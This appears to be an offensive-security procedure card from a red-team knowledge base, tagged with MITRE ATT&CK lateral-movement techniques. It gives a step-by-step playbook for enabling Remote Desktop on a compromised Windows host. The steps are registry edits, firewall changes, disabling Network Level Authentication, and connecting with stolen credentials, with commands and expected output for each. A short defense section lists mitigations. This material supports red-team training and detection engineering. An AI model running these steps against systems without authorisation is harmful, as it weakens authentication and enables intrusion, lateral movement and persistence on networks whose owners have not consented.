---
id: 02c2d498-2932-4566-8491-677a256eaec7
name: windows-rdp-credential-usage
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:31.045164+00:00'
updated_at: '2023-04-10T20:37:56.729452+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
sub_techniques:
  - '[[techniques/Remote Services: Remote Desktop Protocol|T1021.001]]'
tags:
  - rdp
  - windows-credentials
  - lateral-movement
commands:
  - '[[commands/enable-rdp-fdeny-tsconnections]]'
  - '[[commands/enable-remoteadmin-firewall-service]]'
  - '[[commands/enable-remotedesktop-firewall-service]]'
  - '[[commands/disable-rdp-user-authentication]]'
  - '[[commands/check-nla-status-powershell]]'
  - '[[commands/disable-nla-powershell]]'
  - '[[commands/connect-rdp-mstsc]]'
platforms:
  - Windows
tools: []
validated: true
---

# windows-rdp-credential-usage

## Summary

This procedure enables Remote Desktop Protocol (RDP) access on a Windows target machine using valid credentials for remote login, facilitating lateral movement within a network. It covers enabling the RDP service, configuring firewall rules, disabling Network Level Authentication (NLA) to resolve common connection issues like CredSSP errors, and finally connecting with provided credentials. This is typically used after initial access to establish persistent remote control.

## Description

Remote Desktop Protocol (RDP) allows graphical remote access to Windows systems. With valid credentials (username and password), an attacker can log in remotely to perform actions, exfiltrate data, or pivot to other systems. This procedure assumes prior access to the target (e.g., via initial compromise) to run setup commands locally or remotely (e.g., via PSEXEC). Enabling RDP involves modifying registry keys to allow connections, opening firewall ports (typically 3389), and disabling NLA for compatibility with older clients or to bypass authentication prompts. Once configured, connection is made using tools like mstsc.exe. This maps to lateral movement via remote services and valid accounts, common in enterprise environments with domain credentials. Potential risks include detection through unusual registry changes or firewall modifications.

## Requirements

1. Valid username and password with remote desktop user privileges on the target (local or domain account).
2. Network access to the target machine (TCP port 3389 must be reachable after firewall changes).
3. Administrative privileges on the target to enable RDP and modify registry/firewall (or remote execution capability like PSEXEC).
4. RDP client on the attacker's machine (e.g., mstsc on Windows, xfreerdp on Linux).

## Defense

- Implement least privilege: Restrict RDP access to specific users/groups via Group Policy and audit login attempts.
- Enable NLA and CredSSP to require stronger authentication; monitor for disabling attempts via event logs (Event ID 4624 for logons, 4778 for RDP sessions).
- Use network segmentation and firewalls to block RDP (port 3389) externally; consider just-in-time access or VPN requirements.
- Deploy endpoint detection for registry changes (HKLM\System\CurrentControlSet\Control\Terminal Server) and anomalous PowerShell/WMI usage.

## Objectives

1. Enable and configure RDP service on the target for remote access.
2. Resolve common connection barriers like NLA and CredSSP errors.
3. Establish a remote desktop session using valid credentials for lateral movement or persistence.
4. Verify successful access without authentication failures.

## Instructions

### Step 1: Enable RDP Service via Registry

**Context**: Modify the registry to allow incoming RDP connections by setting the fDenyTSConnections key to 0. This is required if RDP is disabled by default.

**Command** ([[commands/enable-rdp-fdeny-tsconnections]]):
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

> This command updates the registry to permit RDP. Run as administrator. If executed remotely, use tools like PSEXEC: `psexec \\target reg add ...`.

**Expected Output**:
```
The operation completed successfully.
```

### Step 2: Enable Firewall Rules for RDP

**Context**: Open necessary firewall exceptions for remote administration and desktop services to allow traffic on port 3389.

**Command** ([[commands/enable-remoteadmin-firewall-service]]):
```cmd
netsh firewall set service remoteadmin enable
```

> Enables the remote admin service in the firewall.

**Expected Output**:
```
Ok.
```

**Command** ([[commands/enable-remotedesktop-firewall-service]]):
```cmd
netsh firewall set service remotedesktop enable
```

> Enables the remote desktop service in the firewall.

**Expected Output**:
```
Ok.
```

### Step 3: Disable NLA to Fix CredSSP Errors

**Context**: Network Level Authentication (NLA) can cause CredSSP delegation errors during connection. Disable it by setting the UserAuthentication registry key to 0 and using PowerShell to configure the terminal service setting.

**Command** ([[commands/disable-rdp-user-authentication]]):
```cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

> Updates the registry to disable user authentication requirement for RDP-Tcp.

**Expected Output**:
```
The operation completed successfully.
```

**Command** ([[commands/check-nla-status-powershell]]):
```powershell
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "$_TARGET" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
```

> Queries the current NLA status (returns True if enabled, False if disabled). Replace $_TARGET with the target hostname or IP.

**Expected Output**:
```
True  # If still enabled; proceed to disable
```

**Command** ([[commands/disable-nla-powershell]]):
```powershell
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "$_TARGET" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
```

> Disables NLA on the RDP-Tcp session.

**Expected Output**:
```
# No output on success; re-run check command to verify False
```

### Step 4: Connect to Target Using RDP Credentials

**Context**: With RDP enabled and configured, use the valid credentials to initiate a remote desktop session from the attacker's machine.

**Command** ([[commands/connect-rdp-mstsc]]):
```cmd
mstsc /v:$_TARGET /u:$_USERNAME /p:$_PASSWORD
```

> Launches the Remote Desktop Connection client. Replace $_TARGET with IP/hostname, $_USERNAME with the account, $_PASSWORD with the password. For non-interactive use, save credentials in an .rdp file.

**Expected Output**:
```
# RDP window opens; successful login shows the target desktop
# Error if credentials invalid: "The logon attempt failed"
```

> If connecting from Linux, use `xfreerdp /u:$_USERNAME /p:$_PASSWORD /v:$_TARGET`. Verify connection by interacting with the remote desktop.
